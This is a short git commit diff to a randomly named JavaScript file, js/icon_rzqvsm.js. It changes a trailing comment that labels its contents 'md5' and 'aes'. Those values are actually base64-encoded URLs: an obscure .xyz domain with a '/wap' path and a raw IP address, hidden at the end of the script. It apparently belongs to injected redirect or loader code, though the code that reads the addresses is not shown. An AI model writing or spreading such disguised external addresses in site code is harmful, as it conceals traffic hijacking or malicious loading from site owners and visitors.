bf190ad3b57b8579201a2a75338e97159f03be65
caocaodage <caocaodajun@gmail.com>
2021-07-19 10:56:53 +0800

    init

--- js/icon_rzqvsm.js
+++ js/icon_rzqvsm.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cDovL3d3dy5mY3hkc3NuZmZ2YmRldjcueHl6P3Y9MQ==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
+})()/** md5:aHR0cDovL3d3dy5mY3hkc3NuZmZ2YmRldjcueHl6L3dhcA==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
